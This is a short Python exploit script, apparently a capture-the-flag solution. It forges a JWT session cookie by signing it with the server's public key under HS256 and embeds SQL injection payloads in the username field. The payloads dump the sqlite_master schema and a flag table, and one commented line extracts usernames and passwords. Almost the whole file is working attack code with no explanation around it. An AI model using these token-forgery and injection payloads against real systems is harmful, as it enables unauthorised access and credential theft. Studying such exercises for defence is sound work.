import jwt

# payloads in order: retrieve tables and columns and extract data
# payload = "1' union select 1, sql, 3 FROM sqlite_master --"
payload = "1' union select 1, top_secret_flaag, 3 FROM flag_storage --"


# Almost perfect: need to retrieve the trird column
# payload = "' OR 1=1 UNION SELECT 1, username || ' ' || password || ' ' || 2, 3 FROM users LIMIT 1 OFFSET 2-- "

# public key stored
public = open('key.pem', 'r').read()

# edit username if needed
data = {"username":payload, "pk":public, "iat":1588678328}

# create session cookies
print (jwt.encode(data, key=public, algorithm='HS256'))
